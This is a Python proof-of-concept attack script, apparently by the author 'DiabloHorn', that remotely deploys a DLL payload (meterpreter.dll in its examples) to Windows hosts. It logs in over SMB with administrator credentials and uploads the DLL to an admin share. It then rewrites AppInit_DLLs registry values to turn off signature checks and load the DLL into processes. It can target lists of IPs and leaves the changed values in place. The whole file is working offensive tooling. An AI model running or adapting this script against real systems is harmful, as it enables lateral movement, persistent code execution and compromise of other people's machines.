#!/usr/bin/env python

#DiabloHorn http://diablohorn.wordpress.com

#This is a psexec alternative which you can use to get a shell without the use of:
# wmi
# services
# mof files
#You have to be patient though or find your own way of triggering a process start. Since this is a POC
#it's NOT stable and it only writes to registry keys that load 32bit DLL files. Additionally it doesn't cleanup after
#itself and it doesn't preserve the original values if there are any.

#During the making of this POC the following references have been used:
# impacket code and examples
# https://bitbucket.org/tenuki/impacket/raw/810fdeaeaf102a329d55b960f600cc2c51d5b839/examples/rregistry.py
# RicharteSolino_2006-impacketv0.9.6.0.pdf
# http://stackoverflow.com/questions/9027642/simple-dll-injection-not-working-using-appinit-dlls-dllmain-not-getting-calle


import sys
import getopt
import string
import random
from impacket.dcerpc.transport import DCERPCTransport
from impacket.smbconnection import *
from impacket.dcerpc import transport, dcerpc, winreg

_reg32 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
#confusing name actually since this is the key for 32bit apps on a 64bit environment
_reg64 = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
_regvalues = ["RequireSignedAppInit_DLLs", "AppInit_DLLs", "LoadAppInit_DLLs"]
_preferredlocations = ["windows\\temp\\", "windows\\system32\\", "windows\\"]

_filepointer = 0
_verbose = False
_localpayloadpath = None
_dcerpctransport = None
_isX64 = True

def showhelp():
    print "[*] DiabloHorn http://diablohorn.wordpress.com"
    print "[*] Remote AppInit_DLLs deployer"
    print "[*] %s -t <target> -u <[domain\]username> -p <password> -f <dll_payload>" % sys.argv[0]
    print "[*] target - use file: syntax to specify a file with multiple ips"
    print "[*] h - for this menu"
    print "[*] examples: "
    print "[*] %s -t 1.2.3.4 -u administrator -p password -f meterpreter.dll" % sys.argv[0]
    print "[*] %s -t 1.2.3.4 -u domain\\administrator -p password -f meterpreter.dll" % sys.argv[0]
    print "[*] %s -t file:/tmp/targets.txt -u administrator -p password -f meterpreter.dll" % sys.argv[0]
    sys.exit(0)

def getloginsession(ip, d, u, p):
    s = SMBConnection(ip, ip)
    if domain is None:
        if s.login(u, p):
            return s
    else:
        if s.login(u, p, domain=d):
            return s
    return None

def logout(conn):
    if isinstance(conn, SMBConnection):
        conn.logoff()

    if isinstance(conn,DCERPCTransport):
        conn.disconnect()

def getrandomchars():
    randomchars = ""
    for i in range(6):
        randomchars += random.choice(string.ascii_letters)
    return randomchars

def getdllname():
    return getrandomchars().lower() + ".dll"

def uploadtoshare(sconn):
    global _preferredlocations, _filepointer
    _filepointer = 0
    print "[*] Starting upload"
    #loop through all found single letter shares which end with a $ sign
    #assume they are drive and try to access the paths
    #assume C: will be first, who uses A: or B: ?
    for share in sconn.listShares():
        foundshare = share['NetName'].decode('utf-16').rstrip('\0')
        if len(foundshare) == 2 and foundshare.endswith('$'):
            for prefloc in _preferredlocations:
                tloc = prefloc + getdllname()
                try:
                    sconn.putFile(foundshare, tloc, putfile_callback)
                    return "%s:\\%s" % (foundshare.strip('$'), tloc)
                except Exception as errobj:
                    print "[!] %s",
                    print errobj
                    pass
    return False

def getregistryconnection(sconn, ip):
    global _dcerpctransport
    #reuse the existing smb connection for dcerpc
    _dcerpctransport = transport.SMBTransport(ip, 445, 'winreg', smb_connection=sconn)
    _dcerpctransport.connect()
    dce = _dcerpctransport.DCERPC_class(_dcerpctransport)
    dce.bind(winreg.MSRPC_UUID_WINREG)
    return winreg.DCERPCWinReg(dce)

def putfile_callback(datalen):
    global _filepointer, _localpayloadpath

    fp = open(_localpayloadpath, "rb")
    if _filepointer == 0:
        _filepointer = datalen
        return fp.read(datalen)
    else:
        fp.seek(_filepointer)
        _filepointer += datalen
        return fp.read(datalen)
    f.close()

def detectarch(regconn):
    global _isX64, _reg64
    openedhklm = regconn.openHKLM()
    reghklm_handle = openedhklm.get_context_handle()
    resp = regconn.regOpenKey(reghklm_handle, _reg64, winreg.KEY_ALL_ACCESS)
    if resp.get_return_code() != 0:
        _isX64 = False
    regconn.regCloseKey(reghklm_handle)

def getregvalues(regconn):
    global _reg32, _reg64, _regvalues, _isX64

    originalvalues = dict()
    openedhklm = regconn.openHKLM()
    reghklm_handle = openedhklm.get_context_handle()
    if _isX64:
        resp = regconn.regOpenKey(reghklm_handle, _reg64, winreg.KEY_ALL_ACCESS)
    else:
        resp = regconn.regOpenKey(reghklm_handle, _reg32, winreg.KEY_ALL_ACCESS)

    if resp.get_return_code() != 0:
        return False

    handleopenedkey = resp.get_context_handle()
    for i in _regvalues:
        resp = regconn.regQueryValue(handleopenedkey, i, 100)
        if resp.get_return_code() != 0:
            pass
        originalvalues[i] = resp.get_data()

    regconn.regCloseKey(reghklm_handle)
    return originalvalues

def setregvalues(regconn,uppath):
    global _reg32, _reg64, _regvalues, _isX64

    openedhklm = regconn.openHKLM()
    reghklm_handle = openedhklm.get_context_handle()
    if _isX64:
        resp = regconn.regOpenKey(reghklm_handle, _reg64, winreg.KEY_ALL_ACCESS)
    else:
        resp = regconn.regOpenKey(reghklm_handle, _reg32, winreg.KEY_ALL_ACCESS)

    if resp.get_return_code() != 0:
        return False

    handleopenedkey = resp.get_context_handle()

    regconn.regSetValue(handleopenedkey, winreg.REG_DWORD, "RequireSignedAppInit_DLLs", 0)
    regconn.regSetValue(handleopenedkey, winreg.REG_SZ, "AppInit_DLLs", uppath)
    regconn.regSetValue(handleopenedkey, winreg.REG_DWORD, "LoadAppInit_DLLs", 1)

    regconn.regCloseKey(reghklm_handle)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        showhelp()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "t:u:p:f:h")
    except getopt.GetoptError, err:
        print str(err)
        sys.exit(0)

    foundshares = list()
    targets = list()
    domain = None
    username = None
    password = None

    for o,a in opts:
        if o == "-h":
            showhelp()
        elif o == "-v":
            _verbose = True
        elif o == "-t":
            targetfilename = a.split('file:')
            if len(targetfilename) == 1:
                targets.append(a)
            else:
                with open(targetfilename[1]) as f:
                    #avoid assigning reference
                    targets = list(f.readlines())
                f.close()
        elif o == "-u":
            domainname = a.split('\\')
            if len(domainname) == 1:
                username = a
            else:
                domain = domainname[0]
                username = domainname[1]
        elif o == "-p":
            password = a
        elif o == "-f":
            _localpayloadpath = a
        else:
            showhelp()

    #prepared to launch
    print "[*] targets %i" % len(targets)
    print "[*] domain %s" % domain
    print "[*] username %s" % username
    print "[*] password %s" % password
    print "[*] payload %s" % _localpayloadpath

    print ""
    for victim in targets:
        victim = victim.rstrip()
        print "[*] attacking %s" % victim
        s = getloginsession(victim, domain, username, password)
        if s:
            print "[*] Connected to %s %s" % (s.getServerName(), s.getServerOS())
        uploadedpath = uploadtoshare(s)
        if not uploadedpath:
            print "[!] upload failed, further actions cancelled"
            logout(s)
            sys.exit(0)
        print "[*] upload OK - %s" % uploadedpath
        print "[*] connecting to the registry"

        registryconnection = getregistryconnection(s, victim)
        print "[*] connected"
        detectarch(registryconnection)
        print "[*] X64 %s" % _isX64
        print "[*] current values"

        origvals = getregvalues(registryconnection)
        print "\t",
        print origvals
        print "[*] setting new values (no signing, uploaded dll, enable appinit)"
        setregvalues(registryconnection, uploadedpath)
        print "[*] new values set"
        origvals = getregvalues(registryconnection)
        print "\t",
        print origvals
        print ""
        logout(_dcerpctransport)
        logout(s)
